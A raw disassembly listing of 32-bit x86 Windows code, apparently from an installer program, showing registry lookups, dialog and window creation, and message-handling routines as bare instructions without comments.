  403a2f:	85 c0                	test   %eax,%eax
  403a31:	74 99                	je     0x4039cc
  403a33:	ff 44 24 14          	incl   0x14(%esp)
  403a37:	33 ed                	xor    %ebp,%ebp
  403a39:	66 39 6c 24 14       	cmp    %bp,0x14(%esp)
  403a3e:	75 83                	jne    0x4039c3
  403a40:	eb 60                	jmp    0x403aa2
  403a42:	56                   	push   %esi
  403a43:	ff 15 e0 80 40 00    	call   *0x4080e0
  403a49:	6a 00                	push   $0x0
  403a4b:	56                   	push   %esi
  403a4c:	e8 eb 28 00 00       	call   0x40633c
  403a51:	6a 01                	push   $0x1
  403a53:	57                   	push   %edi
  403a54:	68 00 78 43 00       	push   $0x437800
  403a59:	ff 15 6c 81 40 00    	call   *0x40816c
  403a5f:	85 c0                	test   %eax,%eax
  403a61:	74 3d                	je     0x403aa0
  403a63:	6a 00                	push   $0x0
  403a65:	57                   	push   %edi
  403a66:	e8 d1 28 00 00       	call   0x40633c
  403a6b:	a1 30 9a 42 00       	mov    0x429a30,%eax
  403a70:	ff b0 24 01 00 00    	push   0x124(%eax)
  403a76:	53                   	push   %ebx
  403a77:	e8 3d 2b 00 00       	call   0x4065b9
  403a7c:	53                   	push   %ebx
  403a7d:	e8 dd 20 00 00       	call   0x405b5f
  403a82:	85 c0                	test   %eax,%eax
  403a84:	75 44                	jne    0x403aca
  403a86:	8b 44 24 10          	mov    0x10(%esp),%eax
  403a8a:	ff 44 24 10          	incl   0x10(%esp)
  403a8e:	85 c0                	test   %eax,%eax
  403a90:	75 0e                	jne    0x403aa0
  403a92:	57                   	push   %edi
  403a93:	e8 41 2e 00 00       	call   0x4068d9
  403a98:	85 c0                	test   %eax,%eax
  403a9a:	0f 84 2c ff ff ff    	je     0x4039cc
  403aa0:	33 ed                	xor    %ebp,%ebp
  403aa2:	e8 cd 00 00 00       	call   0x403b74
  403aa7:	ff 15 94 82 40 00    	call   *0x408294
  403aad:	39 6c 24 18          	cmp    %ebp,0x18(%esp)
  403ab1:	5b                   	pop    %ebx
  403ab2:	74 24                	je     0x403ad8
  403ab4:	68 10 00 20 00       	push   $0x200010
  403ab9:	ff 74 24 18          	push   0x18(%esp)
  403abd:	e8 1a 21 00 00       	call   0x405bdc
  403ac2:	6a 02                	push   $0x2
  403ac4:	ff 15 bc 80 40 00    	call   *0x4080bc
  403aca:	50                   	push   %eax
  403acb:	ff 15 fc 80 40 00    	call   *0x4080fc
  403ad1:	83 64 24 18 00       	andl   $0x0,0x18(%esp)
  403ad6:	eb c8                	jmp    0x403aa0
  403ad8:	39 2d b4 9a 42 00    	cmp    %ebp,0x429ab4
  403ade:	74 7c                	je     0x403b5c
  403ae0:	8d 44 24 20          	lea    0x20(%esp),%eax
  403ae4:	50                   	push   %eax
  403ae5:	6a 28                	push   $0x28
  403ae7:	ff 15 c0 80 40 00    	call   *0x4080c0
  403aed:	50                   	push   %eax
  403aee:	ff 15 24 80 40 00    	call   *0x408024
  403af4:	85 c0                	test   %eax,%eax
  403af6:	74 34                	je     0x403b2c
  403af8:	8d 44 24 28          	lea    0x28(%esp),%eax
  403afc:	50                   	push   %eax
  403afd:	68 30 a2 40 00       	push   $0x40a230
  403b02:	55                   	push   %ebp
  403b03:	ff 15 20 80 40 00    	call   *0x408020
  403b09:	55                   	push   %ebp
  403b0a:	55                   	push   %ebp
  403b0b:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  403b0f:	55                   	push   %ebp
  403b10:	50                   	push   %eax
  403b11:	55                   	push   %ebp
  403b12:	ff 74 24 34          	push   0x34(%esp)
  403b16:	c7 44 24 3c 01 00 00 	movl   $0x1,0x3c(%esp)
  403b1d:	00 
  403b1e:	c7 44 24 48 02 00 00 	movl   $0x2,0x48(%esp)
  403b25:	00 
  403b26:	ff 15 1c 80 40 00    	call   *0x40801c
  403b2c:	6a 04                	push   $0x4
  403b2e:	e8 3d 2e 00 00       	call   0x406970
  403b33:	3b c5                	cmp    %ebp,%eax
  403b35:	be 02 00 04 80       	mov    $0x80040002,%esi
  403b3a:	74 0c                	je     0x403b48
  403b3c:	56                   	push   %esi
  403b3d:	6a 25                	push   $0x25
  403b3f:	55                   	push   %ebp
  403b40:	55                   	push   %ebp
  403b41:	55                   	push   %ebp
  403b42:	ff d0                	call   *%eax
  403b44:	85 c0                	test   %eax,%eax
  403b46:	74 0d                	je     0x403b55
  403b48:	56                   	push   %esi
  403b49:	6a 02                	push   $0x2
  403b4b:	ff 15 0c 82 40 00    	call   *0x40820c
  403b51:	85 c0                	test   %eax,%eax
  403b53:	75 07                	jne    0x403b5c
  403b55:	6a 09                	push   $0x9
  403b57:	e8 af d8 ff ff       	call   0x40140b
  403b5c:	a1 cc 9a 42 00       	mov    0x429acc,%eax
  403b61:	83 f8 ff             	cmp    $0xffffffff,%eax
  403b64:	74 04                	je     0x403b6a
  403b66:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  403b6a:	ff 74 24 1c          	push   0x1c(%esp)
  403b6e:	ff 15 bc 80 40 00    	call   *0x4080bc
  403b74:	a1 18 a0 40 00       	mov    0x40a018,%eax
  403b79:	83 f8 ff             	cmp    $0xffffffff,%eax
  403b7c:	74 0e                	je     0x403b8c
  403b7e:	50                   	push   %eax
  403b7f:	ff 15 fc 80 40 00    	call   *0x4080fc
  403b85:	83 0d 18 a0 40 00 ff 	orl    $0xffffffff,0x40a018
  403b8c:	e8 28 00 00 00       	call   0x403bb9
  403b91:	6a 07                	push   $0x7
  403b93:	68 00 70 43 00       	push   $0x437000
  403b98:	e8 eb 20 00 00       	call   0x405c88
  403b9d:	c3                   	ret
  403b9e:	56                   	push   %esi
  403b9f:	8b 35 cc 0e 42 00    	mov    0x420ecc,%esi
  403ba5:	eb 0a                	jmp    0x403bb1
  403ba7:	ff 74 24 08          	push   0x8(%esp)
  403bab:	ff 56 04             	call   *0x4(%esi)
  403bae:	8b 36                	mov    (%esi),%esi
  403bb0:	59                   	pop    %ecx
  403bb1:	85 f6                	test   %esi,%esi
  403bb3:	75 f2                	jne    0x403ba7
  403bb5:	5e                   	pop    %esi
  403bb6:	c2 04 00             	ret    $0x4
  403bb9:	56                   	push   %esi
  403bba:	8b 35 cc 0e 42 00    	mov    0x420ecc,%esi
  403bc0:	6a 00                	push   $0x0
  403bc2:	e8 d7 ff ff ff       	call   0x403b9e
  403bc7:	85 f6                	test   %esi,%esi
  403bc9:	74 1a                	je     0x403be5
  403bcb:	57                   	push   %edi
  403bcc:	8b fe                	mov    %esi,%edi
  403bce:	8b 36                	mov    (%esi),%esi
  403bd0:	ff 77 08             	push   0x8(%edi)
  403bd3:	ff 15 1c 81 40 00    	call   *0x40811c
  403bd9:	57                   	push   %edi
  403bda:	ff 15 0c 81 40 00    	call   *0x40810c
  403be0:	85 f6                	test   %esi,%esi
  403be2:	75 e8                	jne    0x403bcc
  403be4:	5f                   	pop    %edi
  403be5:	83 25 cc 0e 42 00 00 	andl   $0x0,0x420ecc
  403bec:	5e                   	pop    %esi
  403bed:	c3                   	ret
  403bee:	a1 cc 0e 42 00       	mov    0x420ecc,%eax
  403bf3:	eb 0b                	jmp    0x403c00
  403bf5:	8b 48 08             	mov    0x8(%eax),%ecx
  403bf8:	3b 4c 24 04          	cmp    0x4(%esp),%ecx
  403bfc:	74 0a                	je     0x403c08
  403bfe:	8b 00                	mov    (%eax),%eax
  403c00:	85 c0                	test   %eax,%eax
  403c02:	75 f1                	jne    0x403bf5
  403c04:	40                   	inc    %eax
  403c05:	c2 04 00             	ret    $0x4
  403c08:	33 c0                	xor    %eax,%eax
  403c0a:	eb f9                	jmp    0x403c05
  403c0c:	56                   	push   %esi
  403c0d:	8b 74 24 08          	mov    0x8(%esp),%esi
  403c11:	56                   	push   %esi
  403c12:	e8 d7 ff ff ff       	call   0x403bee
  403c17:	85 c0                	test   %eax,%eax
  403c19:	75 03                	jne    0x403c1e
  403c1b:	40                   	inc    %eax
  403c1c:	eb 2c                	jmp    0x403c4a
  403c1e:	6a 0c                	push   $0xc
  403c20:	6a 40                	push   $0x40
  403c22:	ff 15 10 81 40 00    	call   *0x408110
  403c28:	85 c0                	test   %eax,%eax
  403c2a:	74 1b                	je     0x403c47
  403c2c:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  403c30:	89 70 08             	mov    %esi,0x8(%eax)
  403c33:	89 48 04             	mov    %ecx,0x4(%eax)
  403c36:	8b 0d cc 0e 42 00    	mov    0x420ecc,%ecx
  403c3c:	89 08                	mov    %ecx,(%eax)
  403c3e:	a3 cc 0e 42 00       	mov    %eax,0x420ecc
  403c43:	33 c0                	xor    %eax,%eax
  403c45:	eb 03                	jmp    0x403c4a
  403c47:	83 c8 ff             	or     $0xffffffff,%eax
  403c4a:	5e                   	pop    %esi
  403c4b:	c2 08 00             	ret    $0x8
  403c4e:	83 ec 10             	sub    $0x10,%esp
  403c51:	53                   	push   %ebx
  403c52:	55                   	push   %ebp
  403c53:	56                   	push   %esi
  403c54:	8b 35 30 9a 42 00    	mov    0x429a30,%esi
  403c5a:	57                   	push   %edi
  403c5b:	6a 02                	push   $0x2
  403c5d:	e8 0e 2d 00 00       	call   0x406970
  403c62:	33 ff                	xor    %edi,%edi
  403c64:	3b c7                	cmp    %edi,%eax
  403c66:	74 12                	je     0x403c7a
  403c68:	ff d0                	call   *%eax
  403c6a:	0f b7 c0             	movzwl %ax,%eax
  403c6d:	50                   	push   %eax
  403c6e:	68 00 60 43 00       	push   $0x436000
  403c73:	e8 4b 28 00 00       	call   0x4064c3
  403c78:	eb 5a                	jmp    0x403cd4
  403c7a:	bb 08 2f 42 00       	mov    $0x422f08,%ebx
  403c7f:	57                   	push   %edi
  403c80:	53                   	push   %ebx
  403c81:	57                   	push   %edi
  403c82:	68 90 83 40 00       	push   $0x408390
  403c87:	68 01 00 00 80       	push   $0x80000001
  403c8c:	66 c7 05 00 60 43 00 	movw   $0x30,0x436000
  403c93:	30 00 
  403c95:	66 c7 05 02 60 43 00 	movw   $0x78,0x436002
  403c9c:	78 00 
  403c9e:	66 89 3d 04 60 43 00 	mov    %di,0x436004
  403ca5:	e8 a0 27 00 00       	call   0x40644a
  403caa:	66 39 3d 08 2f 42 00 	cmp    %di,0x422f08
  403cb1:	75 16                	jne    0x403cc9
  403cb3:	57                   	push   %edi
  403cb4:	53                   	push   %ebx
  403cb5:	68 cc 83 40 00       	push   $0x4083cc
  403cba:	68 40 83 40 00       	push   $0x408340
  403cbf:	68 03 00 00 80       	push   $0x80000003
  403cc4:	e8 81 27 00 00       	call   0x40644a
  403cc9:	53                   	push   %ebx
  403cca:	68 00 60 43 00       	push   $0x436000
  403ccf:	e8 c4 28 00 00       	call   0x406598
  403cd4:	e8 4b 02 00 00       	call   0x403f24
  403cd9:	a1 38 9a 42 00       	mov    0x429a38,%eax
  403cde:	bd 00 48 43 00       	mov    $0x434800,%ebp
  403ce3:	83 e0 20             	and    $0x20,%eax
  403ce6:	55                   	push   %ebp
  403ce7:	a3 a0 9a 42 00       	mov    %eax,0x429aa0
  403cec:	c7 05 bc 9a 42 00 00 	movl   $0x10000,0x429abc
  403cf3:	00 01 00 
  403cf6:	e8 58 22 00 00       	call   0x405f53
  403cfb:	85 c0                	test   %eax,%eax
  403cfd:	0f 85 8c 00 00 00    	jne    0x403d8f
  403d03:	8b 4e 48             	mov    0x48(%esi),%ecx
  403d06:	3b cf                	cmp    %edi,%ecx
  403d08:	0f 84 81 00 00 00    	je     0x403d8f
  403d0e:	8b 56 4c             	mov    0x4c(%esi),%edx
  403d11:	a1 58 9a 42 00       	mov    0x429a58,%eax
  403d16:	bb c0 79 42 00       	mov    $0x4279c0,%ebx
  403d1b:	57                   	push   %edi
  403d1c:	8d 14 50             	lea    (%eax,%edx,2),%edx
  403d1f:	53                   	push   %ebx
  403d20:	8d 04 48             	lea    (%eax,%ecx,2),%eax
  403d23:	52                   	push   %edx
  403d24:	50                   	push   %eax
  403d25:	ff 76 44             	push   0x44(%esi)
  403d28:	e8 1d 27 00 00       	call   0x40644a
  403d2d:	66 a1 c0 79 42 00    	mov    0x4279c0,%ax
  403d33:	66 3b c7             	cmp    %di,%ax
  403d36:	74 57                	je     0x403d8f
  403d38:	66 3d 22 00          	cmp    $0x22,%ax
  403d3c:	75 10                	jne    0x403d4e
  403d3e:	bb c2 79 42 00       	mov    $0x4279c2,%ebx
  403d43:	6a 22                	push   $0x22
  403d45:	53                   	push   %ebx
  403d46:	e8 2d 21 00 00       	call   0x405e78
  403d4b:	66 89 38             	mov    %di,(%eax)
  403d4e:	53                   	push   %ebx
  403d4f:	e8 3e 28 00 00       	call   0x406592
  403d54:	8d 44 43 f8          	lea    -0x8(%ebx,%eax,2),%eax
  403d58:	3b c3                	cmp    %ebx,%eax
  403d5a:	76 26                	jbe    0x403d82
  403d5c:	68 80 a3 40 00       	push   $0x40a380
  403d61:	50                   	push   %eax
  403d62:	ff 15 00 81 40 00    	call   *0x408100
  403d68:	85 c0                	test   %eax,%eax
  403d6a:	75 16                	jne    0x403d82
  403d6c:	53                   	push   %ebx
  403d6d:	ff 15 dc 80 40 00    	call   *0x4080dc
  403d73:	83 f8 ff             	cmp    $0xffffffff,%eax
  403d76:	74 04                	je     0x403d7c
  403d78:	a8 10                	test   $0x10,%al
  403d7a:	75 06                	jne    0x403d82
  403d7c:	53                   	push   %ebx
  403d7d:	e8 15 21 00 00       	call   0x405e97
  403d82:	53                   	push   %ebx
  403d83:	e8 c3 20 00 00       	call   0x405e4b
  403d88:	50                   	push   %eax
  403d89:	55                   	push   %ebp
  403d8a:	e8 ed 27 00 00       	call   0x40657c
  403d8f:	55                   	push   %ebp
  403d90:	e8 be 21 00 00       	call   0x405f53
  403d95:	85 c0                	test   %eax,%eax
  403d97:	75 0c                	jne    0x403da5
  403d99:	ff b6 18 01 00 00    	push   0x118(%esi)
  403d9f:	55                   	push   %ebp
  403da0:	e8 14 28 00 00       	call   0x4065b9
  403da5:	68 40 80 00 00       	push   $0x8040
  403daa:	57                   	push   %edi
  403dab:	57                   	push   %edi
  403dac:	6a 01                	push   $0x1
  403dae:	6a 67                	push   $0x67
  403db0:	ff 35 20 9a 42 00    	push   0x429a20
  403db6:	ff 15 44 82 40 00    	call   *0x408244
  403dbc:	a3 08 8a 42 00       	mov    %eax,0x428a08
  403dc1:	83 7e 50 ff          	cmpl   $0xffffffff,0x50(%esi)
  403dc5:	bb c0 89 42 00       	mov    $0x4289c0,%ebx
  403dca:	74 7f                	je     0x403e4b
  403dcc:	8b 0d 20 9a 42 00    	mov    0x429a20,%ecx
  403dd2:	be 78 a3 40 00       	mov    $0x40a378,%esi
  403dd7:	53                   	push   %ebx
  403dd8:	c7 05 c4 89 42 00 00 	movl   $0x401000,0x4289c4
  403ddf:	10 40 00 
  403de2:	89 0d d0 89 42 00    	mov    %ecx,0x4289d0
  403de8:	a3 d4 89 42 00       	mov    %eax,0x4289d4
  403ded:	89 35 e4 89 42 00    	mov    %esi,0x4289e4
  403df3:	ff 15 f4 81 40 00    	call   *0x4081f4
  403df9:	66 85 c0             	test   %ax,%ax
  403dfc:	0f 84 18 01 00 00    	je     0x403f1a
  403e02:	8d 44 24 10          	lea    0x10(%esp),%eax
  403e06:	57                   	push   %edi
  403e07:	50                   	push   %eax
  403e08:	57                   	push   %edi
  403e09:	6a 30                	push   $0x30
  403e0b:	ff 15 f8 81 40 00    	call   *0x4081f8
  403e11:	57                   	push   %edi
  403e12:	ff 35 20 9a 42 00    	push   0x429a20
  403e18:	8b 44 24 24          	mov    0x24(%esp),%eax
  403e1c:	2b 44 24 1c          	sub    0x1c(%esp),%eax
  403e20:	57                   	push   %edi
  403e21:	57                   	push   %edi
  403e22:	50                   	push   %eax
  403e23:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403e27:	2b 44 24 24          	sub    0x24(%esp),%eax
  403e2b:	50                   	push   %eax
  403e2c:	ff 74 24 2c          	push   0x2c(%esp)
  403e30:	ff 74 24 2c          	push   0x2c(%esp)
  403e34:	68 00 00 00 80       	push   $0x80000000
  403e39:	57                   	push   %edi
  403e3a:	56                   	push   %esi
  403e3b:	68 80 00 00 00       	push   $0x80
  403e40:	ff 15 80 82 40 00    	call   *0x408280
  403e46:	a3 e8 2e 42 00       	mov    %eax,0x422ee8
  403e4b:	57                   	push   %edi
  403e4c:	e8 ba d5 ff ff       	call   0x40140b
  403e51:	85 c0                	test   %eax,%eax
  403e53:	74 08                	je     0x403e5d
  403e55:	6a 02                	push   $0x2
  403e57:	58                   	pop    %eax
  403e58:	e9 bf 00 00 00       	jmp    0x403f1c
  403e5d:	e8 c2 00 00 00       	call   0x403f24
  403e62:	39 3d c0 9a 42 00    	cmp    %edi,0x429ac0
  403e68:	0f 85 83 00 00 00    	jne    0x403ef1
  403e6e:	6a 05                	push   $0x5
  403e70:	ff 35 e8 2e 42 00    	push   0x422ee8
  403e76:	ff 15 28 82 40 00    	call   *0x408228
  403e7c:	68 34 83 40 00       	push   $0x408334
  403e81:	e8 7a 2a 00 00       	call   0x406900
  403e86:	85 c0                	test   %eax,%eax
  403e88:	75 0a                	jne    0x403e94
  403e8a:	68 28 83 40 00       	push   $0x408328
  403e8f:	e8 6c 2a 00 00       	call   0x406900
  403e94:	8b 35 00 82 40 00    	mov    0x408200,%esi
  403e9a:	bd 10 83 40 00       	mov    $0x408310,%ebp
  403e9f:	53                   	push   %ebx
  403ea0:	55                   	push   %ebp
  403ea1:	57                   	push   %edi
  403ea2:	ff d6                	call   *%esi
  403ea4:	85 c0                	test   %eax,%eax
  403ea6:	75 16                	jne    0x403ebe
  403ea8:	53                   	push   %ebx
  403ea9:	68 fc 82 40 00       	push   $0x4082fc
  403eae:	57                   	push   %edi
  403eaf:	ff d6                	call   *%esi
  403eb1:	53                   	push   %ebx
  403eb2:	89 2d e4 89 42 00    	mov    %ebp,0x4289e4
  403eb8:	ff 15 f4 81 40 00    	call   *0x4081f4
  403ebe:	a1 00 8a 42 00       	mov    0x428a00,%eax
  403ec3:	57                   	push   %edi
  403ec4:	83 c0 69             	add    $0x69,%eax
  403ec7:	68 fc 3f 40 00       	push   $0x403ffc
  403ecc:	0f b7 c0             	movzwl %ax,%eax
  403ecf:	57                   	push   %edi
  403ed0:	50                   	push   %eax
  403ed1:	ff 35 20 9a 42 00    	push   0x429a20
  403ed7:	ff 15 04 82 40 00    	call   *0x408204
  403edd:	6a 05                	push   $0x5
  403edf:	8b f0                	mov    %eax,%esi
  403ee1:	e8 25 d5 ff ff       	call   0x40140b
  403ee6:	6a 01                	push   $0x1
  403ee8:	e8 b1 fc ff ff       	call   0x403b9e
  403eed:	8b c6                	mov    %esi,%eax
  403eef:	eb 2b                	jmp    0x403f1c
  403ef1:	57                   	push   %edi
  403ef2:	e8 dd 17 00 00       	call   0x4056d4
  403ef7:	85 c0                	test   %eax,%eax
  403ef9:	74 18                	je     0x403f13
  403efb:	39 3d ec 89 42 00    	cmp    %edi,0x4289ec
  403f01:	0f 85 4e ff ff ff    	jne    0x403e55
  403f07:	6a 02                	push   $0x2
  403f09:	e8 fd d4 ff ff       	call   0x40140b
  403f0e:	e9 42 ff ff ff       	jmp    0x403e55
  403f13:	6a 01                	push   $0x1
  403f15:	e8 f1 d4 ff ff       	call   0x40140b
  403f1a:	33 c0                	xor    %eax,%eax
  403f1c:	5f                   	pop    %edi
  403f1d:	5e                   	pop    %esi
  403f1e:	5d                   	pop    %ebp
  403f1f:	5b                   	pop    %ebx
  403f20:	83 c4 10             	add    $0x10,%esp
  403f23:	c3                   	ret
  403f24:	53                   	push   %ebx
  403f25:	55                   	push   %ebp
  403f26:	56                   	push   %esi
  403f27:	57                   	push   %edi
  403f28:	bf 00 60 43 00       	mov    $0x436000,%edi
  403f2d:	bb ff ff 00 00       	mov    $0xffff,%ebx
  403f32:	57                   	push   %edi
  403f33:	e8 a4 25 00 00       	call   0x4064dc
  403f38:	8b 35 64 9a 42 00    	mov    0x429a64,%esi
  403f3e:	85 f6                	test   %esi,%esi
  403f40:	74 45                	je     0x403f87
  403f42:	8b 0d 30 9a 42 00    	mov    0x429a30,%ecx
  403f48:	8b 49 64             	mov    0x64(%ecx),%ecx
  403f4b:	8b d1                	mov    %ecx,%edx
  403f4d:	0f af ce             	imul   %esi,%ecx
  403f50:	f7 da                	neg    %edx
  403f52:	03 0d 60 9a 42 00    	add    0x429a60,%ecx
  403f58:	03 ca                	add    %edx,%ecx
  403f5a:	4e                   	dec    %esi
  403f5b:	66 8b 29             	mov    (%ecx),%bp
  403f5e:	66 33 e8             	xor    %ax,%bp
  403f61:	23 eb                	and    %ebx,%ebp
  403f63:	66 85 ed             	test   %bp,%bp
  403f66:	74 06                	je     0x403f6e
  403f68:	85 f6                	test   %esi,%esi
  403f6a:	75 ec                	jne    0x403f58
  403f6c:	eb 19                	jmp    0x403f87
  403f6e:	8b 51 02             	mov    0x2(%ecx),%edx
  403f71:	89 15 00 8a 42 00    	mov    %edx,0x428a00
  403f77:	8b 51 06             	mov    0x6(%ecx),%edx
  403f7a:	89 15 c8 9a 42 00    	mov    %edx,0x429ac8
  403f80:	8d 51 0a             	lea    0xa(%ecx),%edx
  403f83:	85 d2                	test   %edx,%edx
  403f85:	75 12                	jne    0x403f99
  403f87:	66 81 fb ff ff       	cmp    $0xffff,%bx
  403f8c:	75 07                	jne    0x403f95
  403f8e:	bb ff 03 00 00       	mov    $0x3ff,%ebx
  403f93:	eb a3                	jmp    0x403f38
  403f95:	33 db                	xor    %ebx,%ebx
  403f97:	eb 9f                	jmp    0x403f38
  403f99:	89 15 fc 89 42 00    	mov    %edx,0x4289fc
  403f9f:	0f b7 01             	movzwl (%ecx),%eax
  403fa2:	50                   	push   %eax
  403fa3:	57                   	push   %edi
  403fa4:	e8 1a 25 00 00       	call   0x4064c3
  403fa9:	e8 2f 00 00 00       	call   0x403fdd
  403fae:	a1 4c 9a 42 00       	mov    0x429a4c,%eax
  403fb3:	8b 35 48 9a 42 00    	mov    0x429a48,%esi
  403fb9:	85 c0                	test   %eax,%eax
  403fbb:	74 1b                	je     0x403fd8
  403fbd:	8b f8                	mov    %eax,%edi
  403fbf:	8b 06                	mov    (%esi),%eax
  403fc1:	85 c0                	test   %eax,%eax
  403fc3:	74 0a                	je     0x403fcf
  403fc5:	50                   	push   %eax
  403fc6:	8d 46 18             	lea    0x18(%esi),%eax
  403fc9:	50                   	push   %eax
  403fca:	e8 ea 25 00 00       	call   0x4065b9
  403fcf:	81 c6 18 08 00 00    	add    $0x818,%esi
  403fd5:	4f                   	dec    %edi
  403fd6:	75 e7                	jne    0x403fbf
  403fd8:	5f                   	pop    %edi
  403fd9:	5e                   	pop    %esi
  403fda:	5d                   	pop    %ebp
  403fdb:	5b                   	pop    %ebx
  403fdc:	c3                   	ret
  403fdd:	56                   	push   %esi
  403fde:	be 20 8a 42 00       	mov    $0x428a20,%esi
  403fe3:	6a fe                	push   $0xfffffffe
  403fe5:	56                   	push   %esi
  403fe6:	e8 ce 25 00 00       	call   0x4065b9
  403feb:	56                   	push   %esi
  403fec:	ff 35 e8 2e 42 00    	push   0x422ee8
  403ff2:	ff 15 1c 82 40 00    	call   *0x40821c
  403ff8:	8b c6                	mov    %esi,%eax
  403ffa:	5e                   	pop    %esi
  403ffb:	c3                   	ret
  403ffc:	83 ec 10             	sub    $0x10,%esp
  403fff:	b9 10 01 00 00       	mov    $0x110,%ecx
  404004:	53                   	push   %ebx
  404005:	55                   	push   %ebp
  404006:	56                   	push   %esi
  404007:	8b 74 24 24          	mov    0x24(%esp),%esi
  40400b:	3b f1                	cmp    %ecx,%esi
  40400d:	57                   	push   %edi
  40400e:	0f 84 61 01 00 00    	je     0x404175
  404014:	81 fe 08 04 00 00    	cmp    $0x408,%esi
  40401a:	0f 84 55 01 00 00    	je     0x404175
  404020:	8b 7c 24 24          	mov    0x24(%esp),%edi
  404024:	33 ed                	xor    %ebp,%ebp
  404026:	83 fe 47             	cmp    $0x47,%esi
  404029:	75 13                	jne    0x40403e
  40402b:	6a 13                	push   $0x13
  40402d:	55                   	push   %ebp
  40402e:	55                   	push   %ebp
  40402f:	55                   	push   %ebp
  404030:	55                   	push   %ebp
  404031:	57                   	push   %edi
  404032:	ff 35 e8 2e 42 00    	push   0x422ee8
  404038:	ff 15 d0 81 40 00    	call   *0x4081d0
  40403e:	8b 5c 24 2c          	mov    0x2c(%esp),%ebx
  404042:	83 fe 05             	cmp    $0x5,%esi
  404045:	75 42                	jne    0x404089
  404047:	8b c3                	mov    %ebx,%eax
  404049:	48                   	dec    %eax
  40404a:	f7 d8                	neg    %eax
  40404c:	1b c0                	sbb    %eax,%eax
  40404e:	83 e0 05             	and    $0x5,%eax
  404051:	50                   	push   %eax
  404052:	ff 35 e8 2e 42 00    	push   0x422ee8
  404058:	ff 15 28 82 40 00    	call   *0x408228
  40405e:	83 fb 02             	cmp    $0x2,%ebx
  404061:	0f 85 fb 00 00 00    	jne    0x404162
  404067:	6a f0                	push   $0xfffffff0
  404069:	57                   	push   %edi
  40406a:	ff 15 d4 81 40 00    	call   *0x4081d4
  404070:	25 00 00 01 21       	and    $0x21010000,%eax
  404075:	3d 00 00 00 01       	cmp    $0x1000000,%eax
  40407a:	0f 85 e2 00 00 00    	jne    0x404162
  404080:	6a 04                	push   $0x4
  404082:	57                   	push   %edi
  404083:	ff 15 28 82 40 00    	call   *0x408228
  404089:	81 fe 0d 04 00 00    	cmp    $0x40d,%esi
  40408f:	75 17                	jne    0x4040a8
  404091:	ff 35 f8 89 42 00    	push   0x4289f8
  404097:	ff 15 10 82 40 00    	call   *0x408210
  40409d:	89 1d f8 89 42 00    	mov    %ebx,0x4289f8
  4040a3:	e9 fd 03 00 00       	jmp    0x4044a5
  4040a8:	83 fe 11             	cmp    $0x11,%esi
  4040ab:	75 11                	jne    0x4040be
  4040ad:	55                   	push   %ebp
  4040ae:	55                   	push   %ebp
  4040af:	57                   	push   %edi
  4040b0:	ff 15 40 82 40 00    	call   *0x408240
  4040b6:	33 c0                	xor    %eax,%eax
  4040b8:	40                   	inc    %eax
  4040b9:	e9 0c 04 00 00       	jmp    0x4044ca
  4040be:	81 fe 11 01 00 00    	cmp    $0x111,%esi
  4040c4:	0f 85 98 00 00 00    	jne    0x404162
  4040ca:	0f b7 f3             	movzwl %bx,%esi
  4040cd:	56                   	push   %esi
  4040ce:	57                   	push   %edi
  4040cf:	ff 15 3c 82 40 00    	call   *0x40823c
  4040d5:	8b f8                	mov    %eax,%edi
  4040d7:	3b fd                	cmp    %ebp,%edi
  4040d9:	74 1d                	je     0x4040f8
  4040db:	55                   	push   %ebp
  4040dc:	55                   	push   %ebp
  4040dd:	68 f3 00 00 00       	push   $0xf3
  4040e2:	57                   	push   %edi
  4040e3:	ff 15 58 82 40 00    	call   *0x408258
  4040e9:	57                   	push   %edi
  4040ea:	ff 15 d8 81 40 00    	call   *0x4081d8
  4040f0:	85 c0                	test   %eax,%eax
  4040f2:	0f 84 d0 03 00 00    	je     0x4044c8
  4040f8:	83 fe 01             	cmp    $0x1,%esi
  4040fb:	75 03                	jne    0x404100
  4040fd:	56                   	push   %esi
  4040fe:	eb 2e                	jmp    0x40412e
  404100:	83 fe 03             	cmp    $0x3,%esi
  404103:	75 0c                	jne    0x404111
  404105:	39 2d 60 a3 40 00    	cmp    %ebp,0x40a360
  40410b:	7e 3f                	jle    0x40414c
  40410d:	6a ff                	push   $0xffffffff
  40410f:	eb 1d                	jmp    0x40412e
  404111:	6a 02                	push   $0x2
  404113:	5f                   	pop    %edi
  404114:	3b f7                	cmp    %edi,%esi
  404116:	75 34                	jne    0x40414c
  404118:	39 2d ac 9a 42 00    	cmp    %ebp,0x429aac
  40411e:	74 15                	je     0x404135
  404120:	57                   	push   %edi
  404121:	e8 e5 d2 ff ff       	call   0x40140b
  404126:	89 3d d8 16 42 00    	mov    %edi,0x4216d8
  40412c:	6a 78                	push   $0x78
  40412e:	e8 a1 03 00 00       	call   0x4044d4
  404133:	eb 2d                	jmp    0x404162
  404135:	6a 03                	push   $0x3
  404137:	e8 cf d2 ff ff       	call   0x40140b
  40413c:	85 c0                	test   %eax,%eax
  40413e:	75 22                	jne    0x404162
  404140:	c7 05 d8 16 42 00 01 	movl   $0x1,0x4216d8
  404147:	00 00 00 
  40414a:	eb e0                	jmp    0x40412c
  40414c:	ff 74 24 30          	push   0x30(%esp)
  404150:	53                   	push   %ebx
  404151:	68 11 01 00 00       	push   $0x111
  404156:	ff 35 f8 89 42 00    	push   0x4289f8
  40415c:	ff 15 58 82 40 00    	call   *0x408258
  404162:	ff 74 24 30          	push   0x30(%esp)
  404166:	53                   	push   %ebx
  404167:	ff 74 24 30          	push   0x30(%esp)
  40416b:	e8 f2 03 00 00       	call   0x404562
  404170:	e9 55 03 00 00       	jmp    0x4044ca
  404175:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  404179:	8b 7c 24 24          	mov    0x24(%esp),%edi
  40417d:	3b f1                	cmp    %ecx,%esi
  40417f:	a3 f0 2e 42 00       	mov    %eax,0x422ef0
  404184:	75 4d                	jne    0x4041d3
  404186:	8b 35 3c 82 40 00    	mov    0x40823c,%esi
  40418c:	6a 01                	push   $0x1
  40418e:	57                   	push   %edi
  40418f:	89 3d 28 9a 42 00    	mov    %edi,0x429a28
  404195:	ff d6                	call   *%esi
  404197:	6a 02                	push   $0x2
  404199:	57                   	push   %edi
  40419a:	a3 04 2f 42 00       	mov    %eax,0x422f04
  40419f:	ff d6                	call   *%esi
  4041a1:	6a ff                	push   $0xffffffff
  4041a3:	6a 1c                	push   $0x1c
  4041a5:	57                   	push   %edi
  4041a6:	a3 d0 0e 42 00       	mov    %eax,0x420ed0
  4041ab:	e8 4b 03 00 00       	call   0x4044fb
